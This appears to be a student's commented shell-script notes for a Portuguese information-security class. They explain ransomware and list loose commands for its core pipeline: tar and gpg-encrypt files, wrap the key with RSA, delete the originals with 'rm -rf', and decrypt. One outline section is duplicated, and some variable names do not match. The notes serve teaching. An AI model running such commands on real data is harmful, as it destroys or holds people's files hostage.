# '########:::::'###::::'##::: ##::'######:::'#######::'##::::'##:
#  ##.... ##:::'## ##::: ###:: ##:'##... ##:'##.... ##: ###::'###:
#  ##:::: ##::'##:. ##:: ####: ##: ##:::..:: ##:::: ##: ####'####:
#  ########::'##:::. ##: ## ## ##:. ######:: ##:::: ##: ## ### ##:
#  ##.. ##::: #########: ##. ####::..... ##: ##:::: ##: ##. #: ##:
#  ##::. ##:: ##.... ##: ##:. ###:'##::: ##: ##:::: ##: ##:.:: ##:
#  ##:::. ##: ##:::: ##: ##::. ##:. ######::. #######:: ##:::: ##:
#  ..:::::..::..:::::..::..::::..:::......::::.......:::..:::::..:
#  ::::::::'##:::::'##::::'###::::'########::'########::::::::::::
#  :::::::: ##:'##: ##:::'## ##::: ##.... ##: ##.....:::::::::::::
#  :::::::: ##: ##: ##::'##:. ##:: ##:::: ##: ##::::::::::::::::::
#  :::::::: ##: ##: ##:'##:::. ##: ########:: ######::::::::::::::
#  :::::::: ##: ##: ##: #########: ##.. ##::: ##...:::::::::::::::
#  :::::::: ##: ##: ##: ##.... ##: ##::. ##:: ##::::::::::::::::::
#  ::::::::. ###. ###:: ##:::: ##: ##:::. ##: ########::::::::::::
#  :::::::::...::...:::..:::::..::..:::::..::........:::::::::::::
#
#   Author:      Guilherme Vicentin
#   Matrícula:   CP300760X
#   Dísciplina:  Segurança da Informação
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#  INTRODUÇÃO
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#
#
#    Ransom   +   ware
#   (Resgate)   (Algo relacionado a computadores)
#
#
#   "  Ransomware é um tipo de malware que ameaça publicar os dados
#   pessoais da vítima ou bloquear perpetuamente o acesso a eles,
#   a menos que um resgate seja pago. Se implementado adequadamente,
#   recuperar os arquivos sem a chave criptográfica é um problema
#   considerado intratável  "
#
#   ---
#   Fonte: Wikipedia.
#
#
#
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#  INTRODUÇÃO
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#
#  -> Segundo pesquisa recente, a maioria das organizações está
#     mais preocupada com ransomware do que com qualquer outra
#     ameaças cibernéticas
#
#  -> Ataques dessa natureza têm crescido 1.070% por ano
#
#  -> A principal preocupação é o risco de perda de dados, com a perda
#     de produtividade e a interrupção das operações logo em seguida
#
#  -> 49% era pagariam o resgate à vista e, para outros 25%,
#     isso dependia do valor do resgate.
#
#   ---
#   Relatório Global de Ransoware, FortiNet 2021.
#
#
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#  OPERAÇÃO
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#
#  1) PRÉ-ATAQUE
#       a. atacante gera par de chaves assiméticas
#       b. chave pública é inserida no malware
#
#  2) INFECÇÃO
#       a. atacante realiza instalação do software na máquina da vítima
#
#  3) SEQUESTRO DOS DADOS
#       a. malware gera uma chave simétrica
#       b. utiliza tal chave para criptografar os dados
#       c. criptografa a chave simétrica com chave pública do atacante
#
#  4) FINALIZAÇÃO
#       a. pós pagamento, atacante devolve chave simétrica descriptada
#
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#  INFECÇÃO
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
#
#  1) PRÉ-ATAQUE
#       a. atacante gera par de chaves assiméticas
#       b. chave pública é inserida no malware
#
#  2) INFECÇÃO
#       a. atacante realiza instalação do software na máquina da vítima
#
#  3) SEQUESTRO DOS DADOS
#       a. malware gera uma chave simétrica
#       b. utiliza tal chave para criptografar os dados
#       c. criptografa a chave simétrica com chave pública do atacante
#
#  4) FINALIZAÇÃO
#       a. pós pagamento, atacante devolve chave simétrica descriptada
#
#  :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


# Gerando uma chave alpha numérica com 64 caracteres
head /dev/urandom --lines 100 |                 \
    tr --delete --complement '[:alnum:]' |      \
    cut --characters -64

# Mesmo comando mas exportando como variável
export PASSPHRASE=$(head /dev/urandom --lines 100 | \
    tr --delete --complement '[:alnum:]' | cut --characters -64)


# Compacta todos os arquivos do diretório atual
tar --create --gzip --file files.tar.gz ./*

# Encripta os arquivos compactados usando uma chave simétrica
gpg --batch --passphrase "${__passphrase}" --symmetric "${__tar_file}"


# Cria uma par de chaves para criptografia assimétrica
ssh-keygen -m PEM -t rsa -b 4096 -f id_rsa

# Converte a chave publica em certificado PEM (RFC 4716)
ssh-keygen -f id_rsa.pub -e -m PKCS8 > id_rsa.pub.pem

#
echo 'hello' | openssl rsautl -encrypt -pubin -inkey id_rsa.pub.pem

# Remove os aquivos originais
find data -mindepth 1 -maxdepth 1 -not -name "*.gpg" | xargs -I{} rm -rf {}

# Decriptografa chave
cat encrypted.txt | openssl rsautl -decrypt -inkey my_rsa

# Descriptografar arquivos
gpg --batch --passphrase $PASSPHRASE --decrypt files.tar.gz.gpg > files.tar.gz
